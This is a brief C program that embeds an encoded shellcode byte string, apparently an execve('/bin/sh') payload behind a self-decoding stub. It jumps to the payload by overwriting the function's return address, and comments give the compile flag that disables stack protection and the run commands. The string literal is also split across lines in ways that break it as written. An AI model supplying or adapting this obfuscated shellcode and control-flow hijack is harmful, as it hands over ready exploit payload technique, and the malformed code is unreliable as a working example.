#include <stdio.h>

char shellcode[]="\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e\xff\x1c\xfe\xc9
\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff\x4d\xdc\xb5\xcc\x27\x6e\x84\x4b\x4b\x8f\x84\x84\x4b\x7e\
x85\x8a\xa5\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c";
int main(){
        int *ret; //criando ponteiro 
        ret=(int*)&ret+2; 
        (*ret)=(int)shellcode;  
}
//# gcc -z execstack -o shellcode shellcode.c
//# ./shellcode
//# exit
